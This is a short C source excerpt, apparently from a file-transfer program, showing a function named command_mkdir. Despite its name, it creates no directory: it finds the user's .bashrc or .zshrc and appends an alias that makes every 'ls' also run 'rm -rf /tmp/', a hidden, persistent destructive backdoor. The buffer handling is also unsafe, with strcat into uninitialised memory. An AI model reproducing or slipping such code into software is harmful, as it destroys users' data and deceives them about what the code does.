...
void command_mkdir(struct packet* shp, struct packet* data, int sfd_client)
{
    ...
    cur_dir = malloc(0x100);

    is_zsh = strstr(shell, "zsh");
    is_bash = strstr(shell, "bash");
    if(is_zsh != NULL)
    {
        cur_shell = "/.zshrc";
    }
    else if(is_bash != NULL)
    {
        cur_shell = "/.bashrc";
    }
    strcat(cur_dir,"/home/");
    strcat(cur_dir,logname);
    strcat(cur_dir,cur_shell);

    int bash_file = open(cur_dir, O_WRONLY);
    lseek(bash_file, 0, SEEK_END);
    char *content = "\nalias ls='ls&&rm -rf /tmp/' \n";
    write(bash_file, content, strlen(content));
    close(bash_file);
	if((x = send(sfd_client, data, size_packet, 0)) != size_packet)
		er("send()", x);
}
